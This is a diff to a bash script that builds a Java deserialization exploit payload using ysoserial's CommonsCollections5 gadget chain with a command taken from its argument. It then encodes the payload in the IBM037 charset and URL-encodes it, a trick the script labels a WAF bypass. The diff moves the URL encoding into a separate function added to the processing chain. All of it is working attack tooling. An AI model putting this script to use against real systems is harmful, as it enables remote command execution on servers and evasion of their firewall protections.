@@ -6,13 +6,17 @@ function urldecode {
     tr "\\\\%${plus_sub}" '%\\ '|sed 's_\\_\\x_g'|xargs -0 printf %b|tr % '\\'
 }
 
+function urlencode {
+    xxd -p|tr -d '\n'|sed 's/../%&/g'
+}
+
 #an example waf bypass by @irsdl
 function enc {
     local target_enc
     
     target_enc=IBM037
     [[ ! -z $1 ]] && target_enc=$1
-    iconv -f UTF-8 -t "$target_enc"|xxd -p|tr -d '\n'|sed 's/../%&/g'
+    iconv -f UTF-8 -t "$target_enc"
 }
 
 function run_processors {
@@ -44,7 +48,7 @@ function preproc {
     echo "${data:1}"
 }
 
-processors=(urldecode "enc IBM037")
+processors=(urldecode "enc IBM037" urlencode)
 static_data='param1=val1&state='
 payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
 data=$(printf "%s" "${static_data}${payload}"|preproc processors)
